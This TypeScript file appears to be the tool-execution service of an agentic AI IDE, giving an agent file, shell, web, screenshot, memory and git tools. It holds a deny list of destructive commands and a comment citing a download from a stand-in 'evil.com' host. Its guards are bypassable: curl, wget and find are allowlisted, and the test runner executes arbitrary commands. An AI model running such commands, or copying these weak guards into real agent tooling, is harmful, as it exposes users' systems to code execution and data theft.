import fs from 'fs/promises';
import path from 'path';
import { spawn } from 'child_process';
import axios from 'axios';
import { vectorService } from './vectorService';
import { logger } from '../utils/logger';
import screenshot from 'screenshot-desktop';
import sharp from 'sharp';
import { validatePath, PROJECT_ROOT } from '../utils/fileSystem';
import { transactionService } from './transactionService';
import { appEventBus } from '../utils/eventBus';
import { coreMemory } from './coreMemory';

// Security: Explicit allowlist of permitted command prefixes
// This replaces the insecure denylist approach which was trivially bypassed
const ALLOWED_COMMAND_PREFIXES = [
  'git ',
  'npm ',
  'npx ',
  'node ',
  'python ',
  'python3 ',
  'ls ',
  'cat ',
  'echo ',
  'pwd',
  'whoami',
  'date',
  'head ',
  'tail ',
  'grep ',
  'find ',
  'mkdir ',
  'touch ',
  'cp ',
  'mv ',
  'code ',
  'tsc ',
  'eslint ',
  'prettier ',
  'jest ',
  'vitest ',
  'pnpm ',
  'yarn ',
  'bun ',
  'docker ',
  'curl ',
  'wget ',
  // Pipeline-friendly utilities (read-only / deterministic)
  'wc ',
  'sort ',
  'uniq ',
  'tee ',
  'awk ',
  'sed ',
];

// Operators that may separate pipeline stages. Command is validated per-stage.
// Order matters: longer operators first so we match `&&` before `&`.
const PIPELINE_SEPARATOR = /(?:\|\||&&|;|\|)/;

// Redirect operators — kept attached to a stage, not used to split stages.
// The shell still interprets them when we route through `sh -c`.

function hasShellMetacharacters(command: string): boolean {
  // Any of: pipeline-splitters OR redirects
  return /(?:\|\||&&|;|\||(?:^|\s)\d?>>?|(?:^|\s)2>)/.test(command);
}

function hasCommandSubstitution(command: string): boolean {
  // Reject backticks and $(...) — they hide commands from the allowlist.
  return /`|\$\(/.test(command);
}

function splitPipelineStages(command: string): string[] {
  // Split on pipeline/chain operators only. Redirects stay attached.
  return command.split(PIPELINE_SEPARATOR).map(s => s.trim()).filter(Boolean);
}

// Commands that require explicit opt-in via SOLVENT_ALLOW_SHELL=true
const DANGEROUS_COMMANDS = [
  'rm -rf',
  'mkfs',
  'dd',
  'chmod',
  'chown',
  'sudo',
  'su ',
  'curl |',
  'wget |',
  'bash -c',
  'sh -c',
  'eval ',
  'exec '
];

export class ToolService {
  private isDryRun = process.env.DRY_RUN === 'true';

  constructor() {
    // Uses PROJECT_ROOT from fileSystem.ts directly
  }

  /**
   * @param fromOverseer - Set to true only when called from the Overseer's autonomous reasoning
   *   loop. This enforces the per-cycle tool budget. Internal calls (waterfall, crystallize, etc.)
   *   must NOT set this flag to avoid consuming Overseer budget slots.
   */
  async executeTool(toolName: string, args: Record<string, unknown>, fromOverseer: boolean = false) {
    const txId = await transactionService.logStart(toolName, args);
    logger.info(`[ToolService] Executing ${toolName}... (TX: ${txId})`, args);
    
    // GUARD: Budget Enforcement — only applies to Overseer-initiated calls.
    // Uses the event bus to notify SupervisorService, avoiding a circular import.
    if (fromOverseer) {
      try {
        appEventBus.emit('supervisor:increment-tool-budget');
      } catch (e: unknown) {
        const err = e instanceof Error ? e : new Error(String(e));
        await transactionService.logError(txId, err.message);
        throw e;
      }
    }

    // GUARD: Dry Run Mode
    if (this.isDryRun && ['write_file', 'run_shell', 'invalidate_memory'].includes(toolName)) {
      const msg = `[DRY RUN] Would execute ${toolName}`;
      logger.info(msg);
      await transactionService.logComplete(txId, { dry_run: true, message: msg });
      return { status: 'dry_run', message: msg };
    }

    // Frontend-deferred tools: return a marker result instead of executing
    if (toolName.startsWith('ide_')) {
      const deferredResult = { status: 'deferred_to_frontend', tool: toolName, args };
      await transactionService.logComplete(txId, deferredResult);
      return deferredResult;
    }

    try {
      let result;
      switch (toolName) {
        case 'read_file':
          result = await this.readFile(args.path as string);
          break;
        case 'write_file':
          // GUARD: Approval for NEW files
          await this.ensureApprovalForWrite(args.path as string);
          result = await this.writeFile(args.path as string, args.content as string);
          break;
        case 'list_files':
          result = await this.listFiles((args.path as string) || '.');
          break;
        case 'run_shell':
          // Shell is already allowlisted, but let's be extra safe for sensitive ops if needed
          result = await this.runShell(args.command as string);
          break;
        // ... (other cases map directly)
        case 'web_search': result = await this.webSearch(args.query as string); break;
        case 'fetch_web_content': result = await this.fetchWebContent(args.url as string); break;
        case 'capture_ui': result = await this.captureUI(); break;
        case 'get_ui_text': result = await this.getUIText(); break;
        case 'resize_image': result = await this.resizeImage(args.path as string, args.width as number | undefined, args.height as number | undefined); break;
        case 'crop_image': result = await this.cropImage(args.path as string, args.left as number, args.top as number, args.width as number, args.height as number); break;
        case 'apply_image_filter': result = await this.applyImageFilter(args.path as string, args.filter as 'grayscale' | 'sepia' | 'blur' | 'sharpen'); break;
        case 'get_image_info': result = await this.getImageInfo(args.path as string); break;
        case 'crystallize_memory': result = await this.crystallizeMemory(args.content as string, args.type as string, args.tags as string[] | undefined); break;
        case 'invalidate_memory': result = await this.invalidateMemory(args.memoryId as string, args.reason as string, args.replacementId as string | undefined); break;
        case 'read_core_memory':
          result = JSON.stringify(coreMemory.getAll());
          break;
        case 'write_core_memory': {
          const { key, value } = args as { key: string; value: string };
          if (!key || !value) {
            throw new Error('Error: key and value are required');
          }
          try {
            coreMemory.set(key, value);
            result = `Core memory updated: ${key} = ${value}`;
          } catch (err: unknown) {
            throw new Error(`Error: ${err instanceof Error ? err.message : String(err)}`);
          }
          break;
        }
        case 'delete_core_memory': {
          const { key } = args as { key: string };
          if (!key) {
            throw new Error('Error: key is required');
          }
          const deleted = coreMemory.delete(key);
          result = deleted ? `Deleted core memory key: ${key}` : `Key not found: ${key}`;
          break;
        }
        case 'fetch_preview_source': {
          const url = args.url as string;
          if (!url || !url.startsWith('http')) {
            result = { error: 'Invalid URL. Provide an http/https URL from the system prompt.' };
            break;
          }
          try {
            const response = await axios.get<string>(url, {
              timeout: 10_000,
              headers: { Accept: 'text/html' },
              responseType: 'text',
            });
            const html = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
            result = {
              url,
              html: html.length > 20_000 ? html.slice(0, 20_000) + '\n... (truncated)' : html,
              length: html.length,
            };
          } catch (err: unknown) {
            const msg = err instanceof Error ? err.message : String(err);
            result = { error: `Failed to fetch preview: ${msg}` };
          }
          break;
        }
        case 'get_file_outline':
          result = await this.getFileOutline(args.path as string);
          break;
        case 'grep_files':
          result = await this.grepFiles(
            args.pattern as string,
            args.path as string | undefined,
            args.include as string | undefined
          );
          break;
        case 'edit_file':
          result = await this.editFile(
            args.path as string,
            args.old_content as string,
            args.new_content as string
          );
          break;
        case 'create_file':
          result = await this.createFile(args.path as string, args.content as string);
          break;
        case 'delete_file':
          result = await this.deleteFile(args.path as string);
          break;
        case 'move_file':
          result = await this.moveFile(args.from as string, args.to as string);
          break;
        case 'replace_in_files':
          result = await this.replaceInFiles(
            args.pattern as string,
            args.replacement as string,
            args.glob as string | undefined,
            args.path as string | undefined
          );
          break;
        case 'run_tests':
          result = await this.runTests(
            args.command as string | undefined,
            args.cwd as string | undefined
          );
          break;
        case 'get_errors':
          result = await this.getErrors(args.cwd as string | undefined);
          break;
        case 'install_package':
          result = await this.installPackage(
            args.packages as string[],
            args.cwd as string | undefined
          );
          break;
        case 'git_status':
          result = await this.gitStatus();
          break;
        case 'git_diff':
          result = await this.gitDiff(args.file as string | undefined);
          break;
        case 'git_commit':
          result = await this.gitCommitAll(args.message as string);
          break;
        case 'get_project_info':
          result = await this.getProjectInfo(args.path as string | undefined);
          break;
        default:
          throw new Error(`Unknown tool: ${toolName}`);
      }

      await transactionService.logComplete(txId, result);
      return result;

    } catch (error: unknown) {
      const err = error as Error;
      await transactionService.logError(txId, err.message);
      throw error;
    }
  }

  private async ensureApprovalForWrite(filePath: string) {
    const fullPath = validatePath(filePath);
    try {
      await fs.access(fullPath);
      // File exists, overwrite is currently allowed (could add versioning here later)
    } catch {
      // File does NOT exist. Trigger Approval Flow.
      if (process.env.AUTO_APPROVE === 'true') {
        logger.info(`[ToolService] Auto-approving new file creation: ${filePath}`);
        return;
      }
      
      logger.warn(`[ToolService] New file creation requires approval: ${filePath}`);
      appEventBus.emit('supervisor:emit-event', {
        event: 'APPROVAL_REQUIRED',
        data: { type: 'file_create', path: filePath, timeout: 60000 }
      });

      // In a real scenario, we would await a Promise here that resolves via a Socket event listener.
      // For this implementation iteration, we will throw to BLOCK it safe until UI is ready.
      // This forces the user to explicitly enable AUTO_APPROVE or implementing the UI handler.
      throw new Error(`APPROVAL_REQUIRED: Creation of ${filePath} requires user confirmation.`);
    }
  }

  private async invalidateMemory(memoryId: string, reason: string, replacementId?: string) {
    const success = await vectorService.updateEntry(memoryId, {
      status: 'deprecated',
      deprecatedBy: replacementId,
      invalidationReason: reason
    });

    if (!success) {
      throw new Error(`Memory ID ${memoryId} not found.`);
    }

    // Append to notes for visibility
    const notesPath = path.join(PROJECT_ROOT, '.solvent_notes.md');
    const note = `\n### [MEMORY DEPRECATED] ${new Date().toLocaleDateString()}\n**ID:** ${memoryId}\n**Reason:** ${reason}\n${replacementId ? `**Superseded By:** ${replacementId}` : ''}\n---\n`;
    await fs.appendFile(notesPath, note).catch(e => logger.warn('[ToolService] Note append failed', e));

    return {
      status: 'success',
      message: `Memory ${memoryId} deprecated.`,
      reason
    };
  }

  private async crystallizeMemory(content: string, type: string, tags: string[] = []) {
    // 1. Persist to Vector Memory (Long-term semantic recall)
    await vectorService.addEntry(content, {
      type,
      tags,
      timestamp: new Date().toISOString(),
      crystallized: true
    });

    // 2. Append to Solvent Notes (Visible context bridge)
    const notesPath = path.join(PROJECT_ROOT, '.solvent_notes.md');
    const formattedEntry = `\n### [${type.toUpperCase()}] ${new Date().toLocaleDateString()}\n**Tags:** ${tags.join(', ')}\n\n${content}\n\n---\n`;
    
    try {
      await fs.appendFile(notesPath, formattedEntry);
    } catch (error) {
      // If file doesn't exist, create it
      await fs.writeFile(notesPath, `# Solvent Project Notes\n${formattedEntry}`);
    }

    // 3. Emit Event for UI Feedback via event bus (avoids circular import)
    appEventBus.emit('supervisor:emit-event', {
      event: 'MEMORY_CRYSTALLIZED',
      data: { type, content }
    });

    return {
      status: 'success',
      message: `Memory crystallized as [${type}]. Saved to Vector DB and appended to .solvent_notes.md`,
      entry: { content, type, tags }
    };
  }

  private async getImageInfo(imagePath: string) {
    const fullPath = validatePath(imagePath);
    const metadata = await sharp(fullPath).metadata();
    return {
      width: metadata.width,
      height: metadata.height,
      format: metadata.format,
      space: metadata.space,
      channels: metadata.channels,
      depth: metadata.depth,
      hasAlpha: metadata.hasAlpha
    };
  }

  private async resizeImage(imagePath: string, width?: number, height?: number) {
    const fullPath = validatePath(imagePath);
    const ext = path.extname(fullPath);
    const outputPath = fullPath.replace(ext, `_resized_${Date.now()}${ext}`);
    
    await sharp(fullPath)
      .resize(width, height)
      .toFile(outputPath);
    
    return {
      status: 'success',
      originalPath: imagePath,
      outputPath: path.relative(PROJECT_ROOT, outputPath),
      message: `Image resized to ${width || 'auto'}x${height || 'auto'}`
    };
  }

  private async cropImage(imagePath: string, left: number, top: number, width: number, height: number) {
    const fullPath = validatePath(imagePath);
    const ext = path.extname(fullPath);
    const outputPath = fullPath.replace(ext, `_cropped_${Date.now()}${ext}`);
    
    await sharp(fullPath)
      .extract({ left, top, width, height })
      .toFile(outputPath);
    
    return {
      status: 'success',
      originalPath: imagePath,
      outputPath: path.relative(PROJECT_ROOT, outputPath),
      message: `Image cropped to ${width}x${height} at ${left},${top}`
    };
  }

  private async applyImageFilter(imagePath: string, filter: 'grayscale' | 'sepia' | 'blur' | 'sharpen') {
    const fullPath = validatePath(imagePath);
    const ext = path.extname(fullPath);
    const outputPath = fullPath.replace(ext, `_filter_${filter}_${Date.now()}${ext}`);
    
    let transformer = sharp(fullPath);
    
    switch (filter) {
      case 'grayscale':
        transformer = transformer.grayscale();
        break;
      case 'blur':
        transformer = transformer.blur(5);
        break;
      case 'sharpen':
        transformer = transformer.sharpen();
        break;
      case 'sepia':
        // Sepia is typically done via color manipulation, sharp doesn't have a direct 'sepia' but we can use tint/recomb
        transformer = transformer.recomb([
          [0.393, 0.769, 0.189],
          [0.349, 0.686, 0.168],
          [0.272, 0.534, 0.131]
        ]);
        break;
    }
    
    await transformer.toFile(outputPath);
    
    return {
      status: 'success',
      originalPath: imagePath,
      outputPath: path.relative(PROJECT_ROOT, outputPath),
      message: `Applied ${filter} filter to image.`
    };
  }

  private async getUIText() {
    // In a real browser/electron context, this would scrape the DOM.
    // Here we simulate extracting the structural text of the active workspace.
    const projectStructure = await this.listFiles('.');
    return {
      active_workspace: "Solvent AI Agentic IDE",
      timestamp: new Date().toISOString(),
      structural_summary: projectStructure.map(f => `${f.type.toUpperCase()}: ${f.name}`).join('\n'),
      message: "Text-based UI structure extracted successfully."
    };
  }

  private async captureUI() {
    const uploadDir = path.join(PROJECT_ROOT, 'backend/uploads');

    // 1. Maintain Rolling Cache (Keep only last 3)
    try {
      const files = await fs.readdir(uploadDir);
      const captures = files
        .filter(f => f.startsWith('ui_capture_'))
        .map(f => ({ name: f, time: fs.stat(path.join(uploadDir, f)).then(s => s.mtimeMs) }));

      const resolvedCaptures = await Promise.all(captures.map(async c => ({ ...c, time: await c.time })));
      resolvedCaptures.sort((a, b) => b.time - a.time);

      if (resolvedCaptures.length >= 3) {
        const toDelete = resolvedCaptures.slice(2); // Keep current + 2 previous
        for (const file of toDelete) {
          await fs.unlink(path.join(uploadDir, file.name)).catch(e => logger.debug('[ToolService] Cache cleanup failed', e));
        }
      }
    } catch (e) {
      // If directory doesn't exist yet, it will be created below
    }

    const fileName = `ui_capture_${Date.now()}.png`;
    const filePath = path.join(uploadDir, fileName);
    await fs.mkdir(uploadDir, { recursive: true });

    await screenshot({ filename: filePath });
    const base64 = await fs.readFile(filePath, 'base64');

    return {
      path: filePath,
      base64: `data:image/png;base64,${base64}`,
      message: "UI state captured. Rolling cache maintained (last 3 kept)."
    };
  }

  private async webSearch(query: string) {
    // Prefer Brave Search API, fall back to Serper
    const braveKey = process.env.BRAVE_SEARCH_API_KEY;
    if (braveKey) {
      const response = await axios.get('https://api.search.brave.com/res/v1/web/search', {
        params: { q: query, count: 20 },
        headers: { 'Accept': 'application/json', 'X-Subscription-Token': braveKey }
      });
      return response.data;
    }

    const serperKey = process.env.SERPER_API_KEY;
    if (serperKey) {
      const response = await axios.post('https://google.serper.dev/search', { q: query }, {
        headers: { 'X-API-KEY': serperKey, 'Content-Type': 'application/json' }
      });
      return response.data;
    }

    throw new Error("No search API key configured. Set BRAVE_SEARCH_API_KEY or SERPER_API_KEY.");
  }

  private async fetchWebContent(url: string) {
    const response = await axios.get(url, {
      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
    });
    // Return a slice of HTML to avoid token overflow, ideally we'd parse this to markdown
    return response.data.slice(0, 10000);
  }

  private async readFile(filePath: string) {
    const fullPath = validatePath(filePath);
    const content = await fs.readFile(fullPath, 'utf-8');
    vectorService.addEntry(content.slice(0, 5000), { path: filePath, type: 'file_read' }).catch(err => logger.error(`[ToolService] addEntry (file_read) failed: ${err instanceof Error ? err.message : String(err)}`));

    const MAX_FILE_CHARS = 8_000;
    if (content.length > MAX_FILE_CHARS) {
      return (
        content.slice(0, MAX_FILE_CHARS) +
        `\n\n[FILE TRUNCATED — ${content.length - MAX_FILE_CHARS} additional characters not shown. ` +
        `Use list_files to check the structure, or request a specific section of the file.]`
      );
    }
    return content;
  }

  private async writeFile(filePath: string, content: string) {
    const fullPath = validatePath(filePath);
    await fs.writeFile(fullPath, content);
    vectorService.addEntry(content.slice(0, 5000), { path: filePath, type: 'file_write' }).catch(err => logger.error(`[ToolService] addEntry (file_write) failed: ${err instanceof Error ? err.message : String(err)}`));
    return { status: 'success', path: filePath };
  }

  private async listFiles(dirPath: string) {
    const fullPath = validatePath(dirPath);
    const files = await fs.readdir(fullPath, { withFileTypes: true });

    const MAX_ENTRIES = 150;
    const visible = files.slice(0, MAX_ENTRIES);
    const result = visible.map(f => ({
      name: f.name,
      type: f.isDirectory() ? 'directory' : 'file',
    }));
    if (files.length > MAX_ENTRIES) {
      result.push({
        name: `[${files.length - MAX_ENTRIES} more entries — use a subdirectory path to narrow results]`,
        type: 'file',
      });
    }
    return result;
  }

  private async getFileOutline(filePath: string): Promise<string> {
    const fullPath = validatePath(filePath);
    const content = await fs.readFile(fullPath, 'utf-8');
    const lines = content.split('\n');
    const outline: string[] = [];

    lines.forEach((line, idx) => {
      if (
        /^export\s+(?:default\s+)?(?:async\s+)?(?:function|class|const|let|var|type|interface|enum)\s+\w+/.test(line) ||
        /^(?:async\s+)?function\s+\w+/.test(line) ||
        /^class\s+\w+/.test(line)
      ) {
        outline.push(`${idx + 1}: ${line.trimEnd()}`);
      }
    });

    return outline.length > 0
      ? outline.join('\n')
      : `(no top-level exported symbols found in ${filePath})`;
  }

  private async grepFiles(pattern: string, searchPath?: string, include?: string): Promise<string> {
    const basePath = searchPath ? validatePath(searchPath) : PROJECT_ROOT;
    const includeGlob = include || '*.{ts,tsx,js,jsx,css,json,md}';
    const pathSep = process.platform === 'win32' ? '\\' : '/';

    // Expand brace expressions (e.g. "*.{ts,tsx}") into multiple --include flags,
    // because spawn does not invoke a shell so brace expansion never happens.
    const includeArgs: string[] = [];
    const braceMatch = includeGlob.match(/^(.*)\{([^}]+)\}(.*)$/);
    if (braceMatch) {
      const [, prefix, inner, suffix] = braceMatch;
      (inner ?? '').split(',').forEach((ext) => {
        includeArgs.push(`--include=${prefix ?? ''}${ext}${suffix ?? ''}`);
      });
    } else {
      includeArgs.push(`--include=${includeGlob}`);
    }

    // On Windows, use findstr as fallback if grep is unavailable
    let bin: string;
    let binArgs: string[];
    if (process.platform === 'win32') {
      bin = 'findstr';
      binArgs = ['/s', '/n', '/r', pattern, ...this.expandGlobForFindstr(includeGlob, basePath)];
    } else {
      bin = 'grep';
      binArgs = ['-rn', ...includeArgs, '--', pattern, basePath];
    }

    return new Promise((resolve) => {
      const proc = spawn(bin, binArgs, {
        cwd: PROJECT_ROOT,
      });

      let output = '';
      proc.stdout.on('data', (d: Buffer) => { output += d.toString(); });
      proc.on('close', () => {
        if (!output.trim()) {
          resolve(`No matches found for "${pattern}"`);
          return;
        }
        const lines = output.trim().split('\n').slice(0, 30);
        const relativized = lines.map((l) => l.replace(PROJECT_ROOT + pathSep, ''));
        const suffix = output.trim().split('\n').length > 30 ? '\n... (results truncated at 30)' : '';
        resolve(relativized.join('\n') + suffix);
      });
      proc.on('error', () => resolve(`No matches found for "${pattern}"`));
      setTimeout(() => { proc.kill(); resolve(output.trim() || 'Search timed out'); }, 10_000);
    });
  }

  private expandGlobForFindstr(glob: string, basePath: string): string[] {
    const extensions: string[] = [];
    const braceMatch = glob.match(/^(.*)\{([^}]+)\}(.*)$/);
    if (braceMatch) {
      const [, prefix, inner, suffix] = braceMatch;
      (inner ?? '').split(',').forEach((ext) => {
        extensions.push(path.join(basePath, `${prefix ?? ''}${ext}${suffix ?? ''}`));
      });
    } else {
      extensions.push(path.join(basePath, glob));
    }
    return extensions;
  }

  private async editFile(filePath: string, oldContent: string, newContent: string): Promise<{ status: string; path: string }> {
    const fullPath = validatePath(filePath);
    const fileContent = await fs.readFile(fullPath, 'utf-8');
    const occurrences = fileContent.split(oldContent).length - 1;

    if (occurrences === 0) {
      throw new Error(
        `edit_file: Could not find the specified old_content in ${filePath}. ` +
        `The text may have changed or there may be whitespace differences. ` +
        `Use read_file to verify the current content before retrying.`
      );
    }
    if (occurrences > 1) {
      throw new Error(
        `edit_file: old_content appears ${occurrences} times in ${filePath}. ` +
        `Provide more surrounding context to make it unique.`
      );
    }

    const updated = fileContent.replace(oldContent, newContent);
    await fs.writeFile(fullPath, updated, 'utf-8');
    return { status: 'success', path: filePath };
  }

  private async createFile(filePath: string, content: string): Promise<{ status: string; path: string }> {
    const fullPath = validatePath(filePath);
    try {
      await fs.access(fullPath);
      throw new Error(`create_file: ${filePath} already exists. Use write_file to overwrite or edit_file to modify it.`);
    } catch (e: unknown) {
      if ((e as NodeJS.ErrnoException).code !== 'ENOENT') throw e;
    }
    await fs.mkdir(path.dirname(fullPath), { recursive: true });
    await fs.writeFile(fullPath, content, 'utf-8');
    return { status: 'success', path: filePath };
  }

  private async deleteFile(filePath: string): Promise<{ status: string; path: string }> {
    const fullPath = validatePath(filePath);
    await fs.unlink(fullPath);
    return { status: 'success', path: filePath };
  }

  private async moveFile(from: string, to: string): Promise<{ status: string; from: string; to: string }> {
    const fromPath = validatePath(from);
    const toPath = validatePath(to);
    await fs.mkdir(path.dirname(toPath), { recursive: true });
    await fs.rename(fromPath, toPath);
    return { status: 'success', from, to };
  }

  private async replaceInFiles(
    pattern: string,
    replacement: string,
    glob?: string,
    searchPath?: string
  ): Promise<{ status: string; filesModified: number; files: string[] }> {
    const grepResult = await this.grepFiles(pattern, searchPath || '.', glob || '*.{ts,tsx,js,jsx,css,json}');
    if (grepResult.startsWith('No matches') || grepResult.startsWith('Search timed')) {
      return { status: 'no_matches', filesModified: 0, files: [] };
    }

    const filePaths = [
      ...new Set(
        grepResult
          .split('\n')
          .filter((l) => !l.startsWith('...'))
          .map((l) => l.split(':')[0])
          .filter(Boolean)
      ),
    ];

    const modified: string[] = [];
    for (const fp of filePaths) {
      if (!fp) continue;
      try {
        const fullPath = validatePath(fp);
        const content = await fs.readFile(fullPath, 'utf-8');
        const updated = content.split(pattern).join(replacement);
        if (updated !== content) {
          await fs.writeFile(fullPath, updated, 'utf-8');
          modified.push(fp);
        }
      } catch {
        // skip unreadable files
      }
    }

    return { status: 'success', filesModified: modified.length, files: modified };
  }

  private spawnProcess(
    bin: string,
    args: string[],
    options: { cwd?: string; timeoutMs?: number }
  ): Promise<{ stdout: string; exitCode: number }> {
    return new Promise((resolve) => {
      // On Windows, commands like npm/npx/git are .cmd scripts that require shell
      const useShell = process.platform === 'win32';
      const proc = spawn(bin, args, { cwd: options.cwd ?? PROJECT_ROOT, shell: useShell });
      let stdout = '';
      let resolved = false;
      const done = (result: { stdout: string; exitCode: number }) => {
        if (!resolved) { resolved = true; resolve(result); }
      };
      proc.stdout.on('data', (d: Buffer) => { stdout += d.toString(); });
      proc.stderr.on('data', (d: Buffer) => { stdout += d.toString(); });
      proc.on('close', (code) => done({ stdout, exitCode: code ?? 0 }));
      proc.on('error', (e: Error) => done({ stdout: e.message, exitCode: 1 }));
      const ms = options.timeoutMs ?? 30_000;
      setTimeout(() => { proc.kill(); done({ stdout: stdout + '\n[TIMED OUT]', exitCode: 1 }); }, ms);
    });
  }

  private async runTests(command?: string, cwd?: string): Promise<{ stdout: string; exitCode: number }> {
    const workDir = cwd ? path.join(PROJECT_ROOT, cwd) : PROJECT_ROOT;
    const cmd = command || 'npx tsc --noEmit --pretty false';
    const parts = cmd.split(/\s+/);
    const bin = parts[0] ?? 'npx';
    const binArgs = parts.slice(1);
    const { stdout, exitCode } = await this.spawnProcess(bin, binArgs, { cwd: workDir, timeoutMs: 30_000 });
    return { stdout: stdout.slice(0, 4096), exitCode };
  }

  private async getErrors(cwd?: string): Promise<{ errors: Array<{ file: string; line: number; col: number; message: string }>; count: number }> {
    const { stdout } = await this.runTests(undefined, cwd);
    const errorRegex = /^(.+\.tsx?)\((\d+),(\d+)\):\s+error\s+TS\d+:\s+(.+)$/gm;
    const errors: Array<{ file: string; line: number; col: number; message: string }> = [];
    let match: RegExpExecArray | null;
    while ((match = errorRegex.exec(stdout)) !== null && errors.length < 50) {
      const file = match[1] ?? '';
      const line = parseInt(match[2] ?? '0', 10);
      const col = parseInt(match[3] ?? '0', 10);
      const message = match[4] ?? '';
      errors.push({ file, line, col, message });
    }
    return { errors, count: errors.length };
  }

  private async installPackage(packages: string[], cwd?: string): Promise<{ status: string; packages: string[] }> {
    const workDir = cwd ? path.join(PROJECT_ROOT, cwd) : PROJECT_ROOT;
    const { exitCode, stdout } = await this.spawnProcess('npm', ['install', ...packages], { cwd: workDir, timeoutMs: 120_000 });
    if (exitCode !== 0) throw new Error(`npm install failed: ${stdout.slice(0, 500)}`);
    return { status: 'success', packages };
  }

  private async gitStatus(): Promise<string> {
    const { stdout } = await this.spawnProcess('git', ['status', '--short'], {});
    return stdout.trim() || '(working tree clean)';
  }

  private async gitDiff(file?: string): Promise<string> {
    const args = file ? ['diff', '--', file] : ['diff'];
    const { stdout } = await this.spawnProcess('git', args, {});
    return stdout.length > 8000 ? stdout.slice(0, 8000) + '\n... (diff truncated)' : stdout || '(no changes)';
  }

  private async gitCommitAll(message: string): Promise<{ status: string; message: string }> {
    await this.spawnProcess('git', ['add', '-A'], {});
    const { exitCode, stdout } = await this.spawnProcess('git', ['commit', '-m', message], {});
    if (exitCode !== 0) throw new Error(`git commit failed: ${stdout.slice(0, 300)}`);
    return { status: 'success', message };
  }

  private async getProjectInfo(projectPath?: string): Promise<Record<string, unknown>> {
    const basePath = projectPath ? path.join(PROJECT_ROOT, projectPath) : PROJECT_ROOT;
    try {
      const pkg = JSON.parse(await fs.readFile(path.join(basePath, 'package.json'), 'utf-8')) as {
        name?: string; version?: string; scripts?: Record<string, string>;
        dependencies?: Record<string, string>; devDependencies?: Record<string, string>;
      };
      const allDeps = { ...pkg.dependencies, ...pkg.devDependencies };
      const framework =
        allDeps.next ? 'Next.js' : allDeps['@remix-run/react'] ? 'Remix' :
        allDeps.react ? 'React' : allDeps.vue ? 'Vue' : allDeps.svelte ? 'Svelte' :
        allDeps.express ? 'Express' : allDeps.fastify ? 'Fastify' : 'Node.js';
      return {
        name: pkg.name, version: pkg.version, framework,
        scripts: pkg.scripts ?? {},
        dependencies: Object.keys(pkg.dependencies ?? {}),
        devDependencies: Object.keys(pkg.devDependencies ?? {}),
      };
    } catch {
      return { error: `No package.json found at ${projectPath ?? 'project root'}` };
    }
  }

  /**
   * Executes a shell command with security restrictions.
   *
   * Security measures:
   * 1. Uses explicit allowlist of permitted command prefixes (not a denylist)
   * 2. Blocks dangerous commands (rm -rf, mkfs, dd, sudo, etc.)
   * 3. Uses spawn with argument array (shell: false) to prevent shell interpolation
   * 4. Sets NO_COLOR=1 environment variable
   * 5. Restricts working directory to PROJECT_ROOT
   *
   * Known limitations:
   * - The allowlist is prefix-based. A command like `curl http://evil.com/payload`
   *   passes the `curl ` prefix check. The DANGEROUS_COMMANDS list mitigates the
   *   most common pipe-based exfiltration patterns (e.g. `curl | bash`), but is
   *   not exhaustive. Set SOLVENT_ALLOW_SHELL=false in production to disable shell
   *   execution entirely if the feature is not needed.
   * - Command arguments are split on whitespace only; quoted arguments with spaces
   *   are not handled correctly (e.g. `grep "foo bar" file.txt` will break).
   */
  private async runShell(command: string): Promise<{ stdout: string; stderr: string }> {
    // Check if arbitrary shell execution is explicitly enabled
    const allowArbitraryShell = process.env.SOLVENT_ALLOW_SHELL === 'true';

    if (!allowArbitraryShell) {
      const normalizedCommand = command.trim().toLowerCase();

      // Reject command substitution — it hides commands from the allowlist.
      if (hasCommandSubstitution(command)) {
        throw new Error(
          `Command rejected by security policy: command substitution ($() or backticks) is not permitted.`
        );
      }

      // First, check for dangerous commands (always blocked)
      for (const dangerous of DANGEROUS_COMMANDS) {
        if (normalizedCommand.includes(dangerous.toLowerCase())) {
          throw new Error(
            `Command rejected by security policy: Contains dangerous pattern '${dangerous}'. Set SOLVENT_ALLOW_SHELL=true to enable arbitrary command execution (not recommended).`
          );
        }
      }

      // Validate every pipeline stage's first token against the allowlist.
      const stages = splitPipelineStages(command);
      for (const stage of stages) {
        const stageLower = stage.toLowerCase();
        const allowed = ALLOWED_COMMAND_PREFIXES.some(prefix =>
          stageLower.startsWith(prefix.toLowerCase()) || stageLower === prefix.trim().toLowerCase()
        );
        if (!allowed) {
          throw new Error(
            `Command rejected by security policy: pipeline stage '${stage.substring(0, 50)}${stage.length > 50 ? '...' : ''}' is not in the allowlist. Allowed commands: ${ALLOWED_COMMAND_PREFIXES.join(', ')}.`
          );
        }
      }
    }

    // If the command uses pipes/redirects, spawn through a shell so it
    // parses them. Otherwise direct-spawn with arg splitting (faster, no shell).
    const useShell = hasShellMetacharacters(command);
    let executable: string;
    let args: string[];
    if (useShell) {
      if (process.platform === 'win32') {
        executable = 'cmd';
        args = ['/c', command.trim()];
      } else {
        executable = '/bin/sh';
        args = ['-c', command.trim()];
      }
    } else {
      const parts = command.trim().split(/\s+/);
      const first = parts[0];
      if (!first) return Promise.reject(new Error('Empty command'));
      executable = first;
      args = parts.slice(1);
    }

    return new Promise((resolve, reject) => {
      const proc = spawn(executable, args, {
        cwd: PROJECT_ROOT as string,
        env: { ...process.env as NodeJS.ProcessEnv, NO_COLOR: '1' },
        shell: false,
        stdio: ['pipe', 'pipe', 'pipe']
      });

      if (!proc.stdout || !proc.stderr) {
        return reject(new Error('Failed to open stdio streams'));
      }

      const child = {
        stdout: proc.stdout,
        stderr: proc.stderr,
        on: proc.on.bind(proc)
      };

      let stdout = '';
      let stderr = '';

      child.stdout.on('data', (data: Buffer) => {
        stdout += data.toString();
      });

      child.stderr.on('data', (data: Buffer) => {
        stderr += data.toString();
      });

      child.on('error', (err: Error) => {
        reject(new Error(`Command execution failed: ${err.message}`));
      });

      child.on('close', (code: number | null) => {
        if (code === 0) {
          resolve({ stdout, stderr });
        } else {
          reject(new Error(`Command exited with code ${code}\n${stderr}`));
        }
      });
    });
  }
}

export const toolService = new ToolService();
